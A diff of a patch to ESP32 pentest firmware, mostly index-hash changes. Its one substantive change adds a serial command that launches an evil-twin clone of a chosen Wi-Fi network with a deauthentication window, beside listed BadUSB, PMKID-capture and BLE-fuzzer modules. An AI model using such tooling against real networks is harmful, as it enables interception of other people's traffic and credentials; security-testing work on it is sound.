@@ -1,6 +1,6 @@
 diff --git a/boards/dsolution-183-2mic/NV3023_Panel.h b/boards/dsolution-183-2mic/NV3023_Panel.h
 new file mode 100644
-index 0000000..d021320
+index 00000000..d021320f
 --- /dev/null
 +++ b/boards/dsolution-183-2mic/NV3023_Panel.h
 @@ -0,0 +1,159 @@
@@ -165,7 +165,7 @@ index 0000000..d021320
 +#endif // DSOLUTION_NV3023_PANEL_H
 diff --git a/boards/dsolution-183-2mic/README.md b/boards/dsolution-183-2mic/README.md
 new file mode 100644
-index 0000000..0a5308a
+index 00000000..0a5308a2
 --- /dev/null
 +++ b/boards/dsolution-183-2mic/README.md
 @@ -0,0 +1,262 @@
@@ -433,7 +433,7 @@ index 0000000..0a5308a
 +  Concurrent serial/audio tasks are not covered by the host tests; hardware stress testing is required.
 diff --git a/boards/dsolution-183-2mic/dsolution-183-2mic.ini b/boards/dsolution-183-2mic/dsolution-183-2mic.ini
 new file mode 100644
-index 0000000..0f3e12a
+index 00000000..77a421df
 --- /dev/null
 +++ b/boards/dsolution-183-2mic/dsolution-183-2mic.ini
 @@ -0,0 +1,210 @@
@@ -649,7 +649,7 @@ index 0000000..0f3e12a
 +	https://github.com/lovyan03/LovyanGFX#develop
 diff --git a/boards/dsolution-183-2mic/interface.cpp b/boards/dsolution-183-2mic/interface.cpp
 new file mode 100644
-index 0000000..5252cb2
+index 00000000..5252cb2e
 --- /dev/null
 +++ b/boards/dsolution-183-2mic/interface.cpp
 @@ -0,0 +1,661 @@
@@ -1316,7 +1316,7 @@ index 0000000..5252cb2
 +}
 diff --git a/boards/dsolution-183-2mic/merge_bin.py b/boards/dsolution-183-2mic/merge_bin.py
 new file mode 100644
-index 0000000..372b2f9
+index 00000000..372b2f96
 --- /dev/null
 +++ b/boards/dsolution-183-2mic/merge_bin.py
 @@ -0,0 +1,133 @@
@@ -1455,7 +1455,7 @@ index 0000000..372b2f9
 +env.AddPostAction("$BUILD_DIR/${PROGNAME}.bin", merge_bin)
 diff --git a/boards/dsolution-183-2mic/partitions_16Mb_ota.csv b/boards/dsolution-183-2mic/partitions_16Mb_ota.csv
 new file mode 100644
-index 0000000..f64dcc6
+index 00000000..610fef1b
 --- /dev/null
 +++ b/boards/dsolution-183-2mic/partitions_16Mb_ota.csv
 @@ -0,0 +1,19 @@
@@ -1479,7 +1479,7 @@ index 0000000..f64dcc6
 +spiffs,   data, spiffs,   0xC10000, 0x3E0000,
 +coredump, data, coredump, 0xFF0000, 0x10000,
 diff --git a/embedded_resources/web_interface/index.css b/embedded_resources/web_interface/index.css
-index bda7b42..0bbd995 100644
+index bda7b42a..0bbd995f 100644
 --- a/embedded_resources/web_interface/index.css
 +++ b/embedded_resources/web_interface/index.css
 @@ -1,584 +1,761 @@
@@ -9025,7 +9025,7 @@ index fd616029..18874401 100644
 + })();
 +
 diff --git a/embedded_resources/web_interface/login.html b/embedded_resources/web_interface/login.html
-index f3947c8..c165f33 100644
+index f3947c88..c165f33b 100644
 --- a/embedded_resources/web_interface/login.html
 +++ b/embedded_resources/web_interface/login.html
 @@ -1,43 +1,50 @@
@@ -9118,7 +9118,7 @@ index f3947c8..c165f33 100644
 -
  </html>
 diff --git a/include/DisplayDrivers_User_Setup.h b/include/DisplayDrivers_User_Setup.h
-index f67b633..9dd4164 100644
+index f67b6331..9dd4164c 100644
 --- a/include/DisplayDrivers_User_Setup.h
 +++ b/include/DisplayDrivers_User_Setup.h
 @@ -26,4 +26,19 @@
@@ -9142,7 +9142,7 @@ index f67b633..9dd4164 100644
 +
  #endif // _BRUCE_DISPLAYDRIVERS_USER_SETUP_H
 diff --git a/include/globals.h b/include/globals.h
-index 180e105..61f922e 100644
+index 180e105e..61f922e7 100644
 --- a/include/globals.h
 +++ b/include/globals.h
 @@ -242,7 +242,14 @@ void inputLockInit();
@@ -9161,7 +9161,7 @@ index 180e105..61f922e 100644
  #ifdef HAS_ENCODER
      // NextPress/PrevPress here are rotary-encoder-derived, not raw mechanical
 diff --git a/include/tftLogger.h b/include/tftLogger.h
-index ffb96fe..0ff81d9 100644
+index ffb96fe4..0ff81d97 100644
 --- a/include/tftLogger.h
 +++ b/include/tftLogger.h
 @@ -27,22 +27,25 @@ enum tftFuncs : uint8_t { // DO NOT CHANGE THE ORDER, ADD NEW FUNCTIONS TO THE E
@@ -9246,7 +9246,7 @@ index ffb96fe..0ff81d9 100644
      void drawRect(int32_t x, int32_t y, int32_t w, int32_t h, int32_t color);
      void fillRect(int32_t x, int32_t y, int32_t w, int32_t h, int32_t color);
 diff --git a/platformio.ini b/platformio.ini
-index d8ec5e0..d1c5953 100644
+index d8ec5e0b..d1c5953f 100644
 --- a/platformio.ini
 +++ b/platformio.ini
 @@ -20,6 +20,7 @@ default_envs =
@@ -9258,7 +9258,7 @@ index d8ec5e0..d1c5953 100644
  	; elecrow-28B
  	; elecrow-35B
 diff --git a/src/core/config.cpp b/src/core/config.cpp
-index e7ceca1..3bc596c 100644
+index e7ceca14..3bc596c7 100644
 --- a/src/core/config.cpp
 +++ b/src/core/config.cpp
 @@ -14,6 +14,8 @@ JsonDocument BruceConfig::toJson() const {
@@ -9755,7 +9755,7 @@ index 72d69eba..7fbd4ede 100644
      void addWebUISession(const String &token);
      void removeWebUISession(const String &token);
 diff --git a/src/core/display.cpp b/src/core/display.cpp
-index d3fe50a..0b38b63 100644
+index d3fe50ac..0b38b63d 100644
 --- a/src/core/display.cpp
 +++ b/src/core/display.cpp
 @@ -1,8 +1,11 @@
@@ -10239,7 +10239,7 @@ index d3fe50a..0b38b63 100644
  
      int iconCount = 0;
 diff --git a/src/core/display.h b/src/core/display.h
-index 0345168..7502c90 100644
+index 0345168b..7502c904 100644
 --- a/src/core/display.h
 +++ b/src/core/display.h
 @@ -7,6 +7,7 @@
@@ -10268,7 +10268,7 @@ index 0345168..7502c90 100644
  
 diff --git a/src/core/dsolution_ux.cpp b/src/core/dsolution_ux.cpp
 new file mode 100644
-index 0000000..b49f5b4
+index 00000000..b49f5b4a
 --- /dev/null
 +++ b/src/core/dsolution_ux.cpp
 @@ -0,0 +1,269 @@
@@ -10543,7 +10543,7 @@ index 0000000..b49f5b4
 +#endif
 diff --git a/src/core/dsolution_ux.h b/src/core/dsolution_ux.h
 new file mode 100644
-index 0000000..c56d7ae
+index 00000000..c56d7aef
 --- /dev/null
 +++ b/src/core/dsolution_ux.h
 @@ -0,0 +1,24 @@
@@ -10573,7 +10573,7 @@ index 0000000..c56d7ae
 +#endif
 diff --git a/src/core/feature_guide.cpp b/src/core/feature_guide.cpp
 new file mode 100644
-index 0000000..563f781
+index 00000000..563f7811
 --- /dev/null
 +++ b/src/core/feature_guide.cpp
 @@ -0,0 +1,1159 @@
@@ -11738,7 +11738,7 @@ index 0000000..563f781
 +}
 diff --git a/src/core/feature_guide.h b/src/core/feature_guide.h
 new file mode 100644
-index 0000000..e9a47f7
+index 00000000..e9a47f79
 --- /dev/null
 +++ b/src/core/feature_guide.h
 @@ -0,0 +1,13 @@
@@ -11756,7 +11756,7 @@ index 0000000..e9a47f7
 +
 +#endif
 diff --git a/src/core/main_menu.cpp b/src/core/main_menu.cpp
-index 7420b9e..7ff0934 100644
+index 7420b9e8..7ff0934e 100644
 --- a/src/core/main_menu.cpp
 +++ b/src/core/main_menu.cpp
 @@ -1,12 +1,17 @@
@@ -12007,7 +12007,7 @@ index 7420b9e..7ff0934 100644
      int thumbH = max(6, trackH * _grid.visibleRows / _grid.rows);
      int thumbY = trackY + (trackH - thumbH) * _gridScroll / (_grid.rows - _grid.visibleRows);
 diff --git a/src/core/main_menu.h b/src/core/main_menu.h
-index e8ba931..18327ac 100644
+index e8ba9314..18327ac7 100644
 --- a/src/core/main_menu.h
 +++ b/src/core/main_menu.h
 @@ -4,22 +4,29 @@
@@ -12101,7 +12101,7 @@ index e8ba931..18327ac 100644
      int _totalItems = 0;
 diff --git a/src/core/menu_items/BadUsbMenu.cpp b/src/core/menu_items/BadUsbMenu.cpp
 new file mode 100644
-index 0000000..af35283
+index 00000000..af352837
 --- /dev/null
 +++ b/src/core/menu_items/BadUsbMenu.cpp
 @@ -0,0 +1,57 @@
@@ -12164,7 +12164,7 @@ index 0000000..af35283
 +}
 diff --git a/src/core/menu_items/BadUsbMenu.h b/src/core/menu_items/BadUsbMenu.h
 new file mode 100644
-index 0000000..83c7f4b
+index 00000000..83c7f4bc
 --- /dev/null
 +++ b/src/core/menu_items/BadUsbMenu.h
 @@ -0,0 +1,19 @@
@@ -12188,7 +12188,7 @@ index 0000000..83c7f4b
 +
 +#endif
 diff --git a/src/core/menu_items/BleMenu.cpp b/src/core/menu_items/BleMenu.cpp
-index ed144ba..aa2580d 100644
+index ed144ba6..aa2580dd 100644
 --- a/src/core/menu_items/BleMenu.cpp
 +++ b/src/core/menu_items/BleMenu.cpp
 @@ -3,8 +3,11 @@
@@ -12242,7 +12242,7 @@ index ed144ba..aa2580d 100644
      addOptionToMainMenu();
  
 diff --git a/src/core/menu_items/ConfigMenu.cpp b/src/core/menu_items/ConfigMenu.cpp
-index 6e44fd4..c0ee131 100644
+index 6e44fd4d..c0ee131c 100644
 --- a/src/core/menu_items/ConfigMenu.cpp
 +++ b/src/core/menu_items/ConfigMenu.cpp
 @@ -1,4 +1,8 @@
@@ -12475,7 +12475,7 @@ index 6e44fd4..c0ee131 100644
              //{"Serial use USB",  [this]() { switchToUSBSerial(); }                       },
              //{"Serial use UART", [this]() { switchToUARTSerial(); }                      },
 diff --git a/src/core/menu_items/ConfigMenu.h b/src/core/menu_items/ConfigMenu.h
-index 1854faa..dbbb659 100644
+index 1854faa7..dbbb659d 100644
 --- a/src/core/menu_items/ConfigMenu.h
 +++ b/src/core/menu_items/ConfigMenu.h
 @@ -15,6 +15,7 @@ public:
@@ -12526,7 +12526,7 @@ index 443e395c..97ea605b 100644
      addOptionToMainMenu();
  
 diff --git a/src/core/menu_items/OthersMenu.cpp b/src/core/menu_items/OthersMenu.cpp
-index 40f9956..7a16d85 100644
+index 40f99560..7a16d85a 100644
 --- a/src/core/menu_items/OthersMenu.cpp
 +++ b/src/core/menu_items/OthersMenu.cpp
 @@ -2,16 +2,23 @@
@@ -12624,7 +12624,7 @@ index 40f9956..7a16d85 100644
      loopOptions(options, MENU_TYPE_SUBMENU, "Microphone");
 diff --git a/src/core/menu_items/QuickMenu.cpp b/src/core/menu_items/QuickMenu.cpp
 new file mode 100644
-index 0000000..f42af79
+index 00000000..f42af790
 --- /dev/null
 +++ b/src/core/menu_items/QuickMenu.cpp
 @@ -0,0 +1,81 @@
@@ -12711,7 +12711,7 @@ index 0000000..f42af79
 +#endif
 diff --git a/src/core/menu_items/QuickMenu.h b/src/core/menu_items/QuickMenu.h
 new file mode 100644
-index 0000000..d4117a2
+index 00000000..d4117a2c
 --- /dev/null
 +++ b/src/core/menu_items/QuickMenu.h
 @@ -0,0 +1,12 @@
@@ -12805,7 +12805,7 @@ index 00000000..aefceeae
 +}
 diff --git a/src/core/menu_items/StudioMenu.h b/src/core/menu_items/StudioMenu.h
 new file mode 100644
-index 0000000..0fb739c
+index 00000000..0fb739c1
 --- /dev/null
 +++ b/src/core/menu_items/StudioMenu.h
 @@ -0,0 +1,20 @@
@@ -12830,7 +12830,7 @@ index 0000000..0fb739c
 +
 +#endif
 diff --git a/src/core/menu_items/WifiMenu.cpp b/src/core/menu_items/WifiMenu.cpp
-index 2e6512c..5501dd1 100644
+index 2e6512c1..5501dd1d 100644
 --- a/src/core/menu_items/WifiMenu.cpp
 +++ b/src/core/menu_items/WifiMenu.cpp
 @@ -16,149 +16,268 @@
@@ -13236,7 +13236,7 @@ index 2e6512c..5501dd1 100644
      );
  }
 diff --git a/src/core/menu_items/WifiMenu.h b/src/core/menu_items/WifiMenu.h
-index 9dee9d7..543660f 100644
+index 9dee9d7b..543660fd 100644
 --- a/src/core/menu_items/WifiMenu.h
 +++ b/src/core/menu_items/WifiMenu.h
 @@ -13,7 +13,16 @@ public:
@@ -13258,7 +13258,7 @@ index 9dee9d7..543660f 100644
  
  #endif
 diff --git a/src/core/mykeyboard.cpp b/src/core/mykeyboard.cpp
-index 1b3c43c..e59dea1 100644
+index 1b3c43c2..e59dea12 100644
 --- a/src/core/mykeyboard.cpp
 +++ b/src/core/mykeyboard.cpp
 @@ -1,9 +1,11 @@
@@ -13316,7 +13316,7 @@ index 1b3c43c..e59dea1 100644
                  /* Down Btn to move in X axis (to the right) */
                  if (check(NextPress)) {
 diff --git a/src/core/powerSave.cpp b/src/core/powerSave.cpp
-index 718e3bf..e67b94b 100644
+index 718e3bfe..e67b94bb 100644
 --- a/src/core/powerSave.cpp
 +++ b/src/core/powerSave.cpp
 @@ -1,43 +1,103 @@
@@ -13457,7 +13457,7 @@ index 718e3bf..e67b94b 100644
 +    delay(120);
  }
 diff --git a/src/core/powerSave.h b/src/core/powerSave.h
-index 5bb1c61..e3324ac 100644
+index 5bb1c613..e3324ac4 100644
 --- a/src/core/powerSave.h
 +++ b/src/core/powerSave.h
 @@ -1,3 +1,6 @@
@@ -13478,7 +13478,7 @@ index 5bb1c61..e3324ac 100644
 +
 +#endif
 diff --git a/src/core/radio_mem.h b/src/core/radio_mem.h
-index 0d88860..4daad61 100644
+index 0d88860f..4daad610 100644
 --- a/src/core/radio_mem.h
 +++ b/src/core/radio_mem.h
 @@ -15,11 +15,17 @@
@@ -13620,7 +13620,7 @@ index 0d88860..4daad61 100644
  }
  
 diff --git a/src/core/sd_functions.cpp b/src/core/sd_functions.cpp
-index 054b629..9945434 100644
+index 054b6298..99454343 100644
 --- a/src/core/sd_functions.cpp
 +++ b/src/core/sd_functions.cpp
 @@ -3,16 +3,20 @@
@@ -13682,7 +13682,7 @@ index 054b629..9945434 100644
                  options.insert(options.begin(), {"JS Script Run", [&]() {
 diff --git a/src/core/seclab_util.cpp b/src/core/seclab_util.cpp
 new file mode 100644
-index 0000000..7f743fe
+index 00000000..7f743fe8
 --- /dev/null
 +++ b/src/core/seclab_util.cpp
 @@ -0,0 +1,123 @@
@@ -13811,7 +13811,7 @@ index 0000000..7f743fe
 +}
 diff --git a/src/core/seclab_util.h b/src/core/seclab_util.h
 new file mode 100644
-index 0000000..13a9f7a
+index 00000000..13a9f7a9
 --- /dev/null
 +++ b/src/core/seclab_util.h
 @@ -0,0 +1,26 @@
@@ -13842,7 +13842,7 @@ index 0000000..13a9f7a
 +
 +#endif
 diff --git a/src/core/serial_commands/cli.cpp b/src/core/serial_commands/cli.cpp
-index 1fd4750..35880ab 100644
+index 1fd47501..35880ab5 100644
 --- a/src/core/serial_commands/cli.cpp
 +++ b/src/core/serial_commands/cli.cpp
 @@ -4,18 +4,21 @@
@@ -13893,7 +13893,7 @@ index 1fd4750..35880ab 100644
  #endif
  
 diff --git a/src/core/serial_commands/power_commands.cpp b/src/core/serial_commands/power_commands.cpp
-index 49138d4..0bea13f 100644
+index 49138d4a..0bea13fb 100644
 --- a/src/core/serial_commands/power_commands.cpp
 +++ b/src/core/serial_commands/power_commands.cpp
 @@ -1,5 +1,6 @@
@@ -13932,10 +13932,10 @@ index 49138d4..0bea13f 100644
  }
 diff --git a/src/core/serial_commands/seclab_commands.cpp b/src/core/serial_commands/seclab_commands.cpp
 new file mode 100644
-index 0000000..59e2ad0
+index 00000000..de37131f
 --- /dev/null
 +++ b/src/core/serial_commands/seclab_commands.cpp
-@@ -0,0 +1,486 @@
+@@ -0,0 +1,504 @@
 +#include "seclab_commands.h"
 +#include <Arduino.h>
 +#include <globals.h>
@@ -13950,6 +13950,7 @@ index 0000000..59e2ad0
 +#include "modules/wifi/lan_auditor.h"
 +#include "modules/wifi/lan_guard.h"
 +#include "modules/wifi/napt_http_inspector.h"
++#include "modules/wifi/evil_twin_logic.h"
 +#include "modules/wifi/napt_router.h"
 +#include "modules/wifi/pmf_csa_test.h"
 +#include "modules/wifi/pmkid_capture.h"
@@ -13975,6 +13976,7 @@ index 0000000..59e2ad0
 +    slPrint("  seclab os windows|macos|linux");
 +    slPrint("  seclab ble tag_start|tag_stop|pair|fuzzer|clear|status [addr] [type] [justworks|mitm|duration]");
 +    slPrint("  seclab chain list | start <id> | stop <id> | status  (ids: recon-capture napt-lan portal-lan guard-audit ble-pipeline usb-verify evil-twin-route)");
++    slPrint("  seclab chain start evil-twin-route <ssid> <channel>   explicit clone target");
 +    slPrint("  seclab chain auto napt-lan|portal-lan|guard-audit [on|off]");
 +    slPrint("  KEYS: pairmode perm hidauto oswarn hidtimeout httpport httpauto redact handoff");
 +    slPrint("        lanauto fuzzer autoexport csa(channel,bursts) chainNaptLanAuto chainPortalLanAuto chainGuardAuditAuto");
@@ -14036,6 +14038,7 @@ index 0000000..59e2ad0
 +    chainStop("guard-audit");
 +    chainStop("recon-capture");
 +    chainStop("usb-verify");
++    chainStop("evil-twin-route");
 +    slPrint("All stoppable SecLab+ tools stopped");
 +    if (blePairingAuditIsRunning()) slPrint("Pairing audit will finish on its own");
 +}
@@ -14372,6 +14375,21 @@ index 0000000..59e2ad0
 +        if (a == "list" || a == "status" || a.isEmpty()) { slPrint(chainGetStateJson()); return true; }
 +        if (a == "start") {
 +            if (v.isEmpty()) { slPrint("Usage: seclab chain start <id>  (recon-capture|napt-lan|portal-lan|guard-audit|ble-pipeline|usb-verify|evil-twin-route [ssid] [ch])"); return false; }
++            // evil-twin-route accepts an explicit target so the CLI never has to
++            // depend on a stale /wifi_airtime.json snapshot.
++            String lower = v;
++            lower.toLowerCase();
++            if (lower == "evil-twin-route" && !x.isEmpty()) {
++                int ch = x.toInt();
++                if (!evilTwinChannelUsable(ch)) {
++                    slPrint("Invalid channel. Usage: seclab chain start evil-twin-route <ssid> <channel 1-13>");
++                    return false;
++                }
++                bool ok = portalNaptStartEvilTwinEx(x, (uint8_t)ch, nullptr, true, true, &err);
++                slResult(ok, String("Evil Twin on \"") + x + "\" CH" + String(ch) +
++                                 " (short deauth window, route in place)", err);
++                return ok;
++            }
 +            bool ok = chainStart(v, &err);
 +            slResult(ok, String("Chain \"") + v + "\" started", err);
 +            return ok;
@@ -14424,7 +14442,7 @@ index 0000000..59e2ad0
 +}
 diff --git a/src/core/serial_commands/seclab_commands.h b/src/core/serial_commands/seclab_commands.h
 new file mode 100644
-index 0000000..40f54b0
+index 00000000..40f54b01
 --- /dev/null
 +++ b/src/core/serial_commands/seclab_commands.h
 @@ -0,0 +1,8 @@
@@ -14437,7 +14455,7 @@ index 0000000..40f54b0
 +
 +#endif
 diff --git a/src/core/serial_commands/settings_commands.cpp b/src/core/serial_commands/settings_commands.cpp
-index 9c26f28..38fc0ae 100644
+index 9c26f281..38fc0aeb 100644
 --- a/src/core/serial_commands/settings_commands.cpp
 +++ b/src/core/serial_commands/settings_commands.cpp
 @@ -62,10 +62,13 @@ uint32_t settingsCallback(cmd *c) {
@@ -14455,7 +14473,7 @@ index 9c26f28..38fc0ae 100644
          bruceConfig.setWebUICreds(
              setting_value.substring(0, setting_value.indexOf(",")),
 diff --git a/src/core/serial_commands/util_commands.cpp b/src/core/serial_commands/util_commands.cpp
-index af3650f..669ce42 100644
+index af3650f3..669ce423 100644
 --- a/src/core/serial_commands/util_commands.cpp
 +++ b/src/core/serial_commands/util_commands.cpp
 @@ -7,6 +7,7 @@
@@ -14486,7 +14504,7 @@ index af3650f..669ce42 100644
          serialDevice->println(
              TFT_WIDTH + String("x") + TFT_HEIGHT + String("x") + bruceConfigPins.rotation
 diff --git a/src/core/serial_commands/wifi_commands.cpp b/src/core/serial_commands/wifi_commands.cpp
-index 95c54ce..7e3efce 100644
+index 95c54ced..7e3efce7 100644
 --- a/src/core/serial_commands/wifi_commands.cpp
 +++ b/src/core/serial_commands/wifi_commands.cpp
 @@ -5,6 +5,9 @@
@@ -14717,7 +14735,7 @@ index 908c2c31..1675e1ef 100644
  
      xTaskCreatePinnedToCore(
 diff --git a/src/core/serialcmds.h b/src/core/serialcmds.h
-index fbef2fe..46c3d25 100644
+index fbef2fe2..46c3d25b 100644
 --- a/src/core/serialcmds.h
 +++ b/src/core/serialcmds.h
 @@ -8,4 +8,5 @@ extern TaskHandle_t serialcmdsTaskHandle;
@@ -14727,7 +14745,7 @@ index fbef2fe..46c3d25 100644
 +bool parseSerialCommandCapture(const String &command, String &output, uint32_t timeoutMs = 1500);
  #endif
 diff --git a/src/core/settings.cpp b/src/core/settings.cpp
-index df8bbcb..08dd98a 100644
+index df8bbcb6..08dd98ad 100644
 --- a/src/core/settings.cpp
 +++ b/src/core/settings.cpp
 @@ -8,13 +8,17 @@
@@ -14938,7 +14956,7 @@ index df8bbcb..08dd98a 100644
               bruceConfig.ledBright = 50;
               bruceConfig.ledColor = 0x960064;
 diff --git a/src/core/settings.h b/src/core/settings.h
-index eed52ee..063a2f7 100644
+index eed52ee9..063a2f70 100644
 --- a/src/core/settings.h
 +++ b/src/core/settings.h
 @@ -60,6 +60,7 @@ void setEvilPasswordMode();
@@ -14969,7 +14987,7 @@ index eed52ee..063a2f7 100644
  
  void runClockLoop(bool showMenuHint = false);
 diff --git a/src/core/settingsColor.h b/src/core/settingsColor.h
-index 035a816..bad7141 100644
+index 035a8164..bad7141a 100644
 --- a/src/core/settingsColor.h
 +++ b/src/core/settingsColor.h
 @@ -57,6 +57,14 @@ struct ColorEntry {
@@ -14988,7 +15006,7 @@ index 035a816..bad7141 100644
      {"White",         UI_COLOR_WHITE_PRI,         UI_COLOR_WHITE_SEC,         UI_COLOR_WHITE_BG        },
      {"Dark Gray",     UI_COLOR_DARK_GRAY_PRI,     UI_COLOR_DARK_GRAY_SEC,     UI_COLOR_DARK_GRAY_BG    },
 diff --git a/src/core/startup_app.cpp b/src/core/startup_app.cpp
-index 4663a0d..7e647cc 100644
+index 4663a0d5..7e647cc0 100644
 --- a/src/core/startup_app.cpp
 +++ b/src/core/startup_app.cpp
 @@ -13,14 +13,16 @@
@@ -15036,7 +15054,7 @@ index 4663a0d..7e647cc 100644
      _startupApps["JS Interpreter"] = []() {
 diff --git a/src/core/tftLogger/legacy_text_packet.h b/src/core/tftLogger/legacy_text_packet.h
 new file mode 100644
-index 0000000..147cd1f
+index 00000000..147cd1fe
 --- /dev/null
 +++ b/src/core/tftLogger/legacy_text_packet.h
 @@ -0,0 +1,16 @@
@@ -15057,7 +15075,7 @@ index 0000000..147cd1f
 +    return size - 1;
 +}
 diff --git a/src/core/tftLogger/tftLogger.cpp b/src/core/tftLogger/tftLogger.cpp
-index 85b9dbe..43b4040 100644
+index 85b9dbe9..43b40406 100644
 --- a/src/core/tftLogger/tftLogger.cpp
 +++ b/src/core/tftLogger/tftLogger.cpp
 @@ -2,6 +2,10 @@
@@ -15475,7 +15493,7 @@ index 85b9dbe..43b4040 100644
      uint8_t pos = 0;
      logWriteHeader(buffer, pos, PRINT);
 diff --git a/src/core/theme.cpp b/src/core/theme.cpp
-index c32e864..0ba5698 100644
+index c32e8644..0ba5698f 100644
 --- a/src/core/theme.cpp
 +++ b/src/core/theme.cpp
 @@ -140,6 +140,12 @@ bool BruceTheme::validateImgFile(FS *fs, String filepath) {
@@ -15492,7 +15510,7 @@ index c32e864..0ba5698 100644
      bgColor = background == nullptr ? 0x0 : *background;
  }
 diff --git a/src/core/theme.h b/src/core/theme.h
-index 1e7c94e..8c58e95 100644
+index 1e7c94ef..8c58e95f 100644
 --- a/src/core/theme.h
 +++ b/src/core/theme.h
 @@ -3,8 +3,12 @@
@@ -15522,7 +15540,7 @@ index 1e7c94e..8c58e95 100644
      // UI Color
 diff --git a/src/core/ui_sound_wav.h b/src/core/ui_sound_wav.h
 new file mode 100644
-index 0000000..7aa98f0
+index 00000000..7aa98f0f
 --- /dev/null
 +++ b/src/core/ui_sound_wav.h
 @@ -0,0 +1,21 @@
@@ -15548,7 +15566,7 @@ index 0000000..7aa98f0
 +    return true;
 +}
 diff --git a/src/core/utils.cpp b/src/core/utils.cpp
-index aacdf98..e66d077 100644
+index aacdf98b..e66d0771 100644
 --- a/src/core/utils.cpp
 +++ b/src/core/utils.cpp
 @@ -1,8 +1,17 @@
@@ -15665,7 +15683,7 @@ index aacdf98..e66d077 100644
 +    esp_restart();
 +}
 diff --git a/src/core/utils.h b/src/core/utils.h
-index 043a5d2..1f05180 100644
+index 043a5d2d..1f05180b 100644
 --- a/src/core/utils.h
 +++ b/src/core/utils.h
 @@ -5,6 +5,12 @@
@@ -15689,7 +15707,7 @@ index 043a5d2..1f05180 100644
  #endif
 diff --git a/src/core/virtual_msc.cpp b/src/core/virtual_msc.cpp
 new file mode 100644
-index 0000000..713fb99
+index 00000000..713fb990
 --- /dev/null
 +++ b/src/core/virtual_msc.cpp
 @@ -0,0 +1,1035 @@
@@ -16730,7 +16748,7 @@ index 0000000..713fb99
 +#endif
 diff --git a/src/core/virtual_msc.h b/src/core/virtual_msc.h
 new file mode 100644
-index 0000000..a28c8b5
+index 00000000..a28c8b56
 --- /dev/null
 +++ b/src/core/virtual_msc.h
 @@ -0,0 +1,20 @@
@@ -16755,7 +16773,7 @@ index 0000000..a28c8b5
 +
 +#endif
 diff --git a/src/core/wifi/webInterface.cpp b/src/core/wifi/webInterface.cpp
-index a8679bd6..9e0bb1ae 100644
+index a8679bd6..b6d5f164 100644
 --- a/src/core/wifi/webInterface.cpp
 +++ b/src/core/wifi/webInterface.cpp
 @@ -1,19 +1,49 @@
@@ -19544,7 +19562,7 @@ index a8679bd6..9e0bb1ae 100644
 +            smartBadUsbStopLedLink();
 +            bleTagBeaconStop();
 +            naptStop(false);
-+            chainStop("napt-lan"); chainStop("portal-lan"); chainStop("guard-audit"); chainStop("recon-capture"); chainStop("usb-verify");
++            chainStop("napt-lan"); chainStop("portal-lan"); chainStop("guard-audit"); chainStop("recon-capture"); chainStop("usb-verify"); chainStop("evil-twin-route");
 +            String msg = "All stoppable SecLab+ tools stopped";
 +            if (blePairingAuditIsRunning()) msg += ". Pairing audit will finish on its own";
 +            reply(true, msg);
@@ -19874,7 +19892,7 @@ index a8679bd6..9e0bb1ae 100644
      }
  }
 diff --git a/src/core/wifi/webInterface.h b/src/core/wifi/webInterface.h
-index d14ae9f..775ed9f 100644
+index d14ae9f0..775ed9f3 100644
 --- a/src/core/wifi/webInterface.h
 +++ b/src/core/wifi/webInterface.h
 @@ -23,5 +23,18 @@ void serveWebUIFile(
@@ -19898,7 +19916,7 @@ index d14ae9f..775ed9f 100644
  void cleanlyStopWebUiForWiFiFeature();
 diff --git a/src/core/wifi/web_navigation.h b/src/core/wifi/web_navigation.h
 new file mode 100644
-index 0000000..e5e30ea
+index 00000000..e5e30ea6
 --- /dev/null
 +++ b/src/core/wifi/web_navigation.h
 @@ -0,0 +1,37 @@
@@ -19940,7 +19958,7 @@ index 0000000..e5e30ea
 +    return true;
 +}
 diff --git a/src/core/wifi/wifi_common.cpp b/src/core/wifi/wifi_common.cpp
-index 0e32e4d..9040921 100644
+index 0e32e4dd..9040921c 100644
 --- a/src/core/wifi/wifi_common.cpp
 +++ b/src/core/wifi/wifi_common.cpp
 @@ -1,11 +1,13 @@
@@ -20083,7 +20101,7 @@ index 0e32e4d..9040921 100644
          // Start timezone update in background if not already running
          if (timezoneTaskHandle == NULL) {
 diff --git a/src/core/wifi/wifi_common.h b/src/core/wifi/wifi_common.h
-index 8d97a20..e0d8453 100644
+index 8d97a20f..e0d84536 100644
 --- a/src/core/wifi/wifi_common.h
 +++ b/src/core/wifi/wifi_common.h
 @@ -11,6 +11,8 @@
@@ -20096,7 +20114,7 @@ index 8d97a20..e0d8453 100644
  /**
   * @brief Opens a menu to connect to a wifi
 diff --git a/src/main.cpp b/src/main.cpp
-index eebc4a9..c3d0478 100644
+index eebc4a91..c3d04789 100644
 --- a/src/main.cpp
 +++ b/src/main.cpp
 @@ -1,3 +1,4 @@
@@ -20956,7 +20974,7 @@ index 00000000..5d50f8ff
 +#endif
 diff --git a/src/modules/badusb_ble/badusb_autorun.h b/src/modules/badusb_ble/badusb_autorun.h
 new file mode 100644
-index 0000000..2779eda
+index 00000000..2779eda3
 --- /dev/null
 +++ b/src/modules/badusb_ble/badusb_autorun.h
 @@ -0,0 +1,25 @@
@@ -21122,7 +21140,7 @@ index bb5aeb4f..f0460124 100644
  void key_input_from_string(const String &text);
 diff --git a/src/modules/badusb_ble/smart_badusb.cpp b/src/modules/badusb_ble/smart_badusb.cpp
 new file mode 100644
-index 0000000..b5be732
+index 00000000..b5be732d
 --- /dev/null
 +++ b/src/modules/badusb_ble/smart_badusb.cpp
 @@ -0,0 +1,783 @@
@@ -21911,7 +21929,7 @@ index 0000000..b5be732
 +#endif
 diff --git a/src/modules/badusb_ble/smart_badusb.h b/src/modules/badusb_ble/smart_badusb.h
 new file mode 100644
-index 0000000..8df9cc8
+index 00000000..8df9cc85
 --- /dev/null
 +++ b/src/modules/badusb_ble/smart_badusb.h
 @@ -0,0 +1,40 @@
@@ -21957,7 +21975,7 @@ index 0000000..8df9cc8
 +#endif
 diff --git a/src/modules/badusb_ble/usb_identity.h b/src/modules/badusb_ble/usb_identity.h
 new file mode 100644
-index 0000000..bb2cef9
+index 00000000..bb2cef91
 --- /dev/null
 +++ b/src/modules/badusb_ble/usb_identity.h
 @@ -0,0 +1,26 @@
@@ -21988,7 +22006,7 @@ index 0000000..bb2cef9
 +    displayInfo(info, true);
 +}
 diff --git a/src/modules/bjs_interpreter/display_js.cpp b/src/modules/bjs_interpreter/display_js.cpp
-index 11423ba..5638ab0 100644
+index 11423ba3..5638ab00 100644
 --- a/src/modules/bjs_interpreter/display_js.cpp
 +++ b/src/modules/bjs_interpreter/display_js.cpp
 @@ -37,13 +37,13 @@ void native_sprite_finalizer(JSContext *ctx, void *opaque) {
@@ -22066,7 +22084,7 @@ index 11423ba..5638ab0 100644
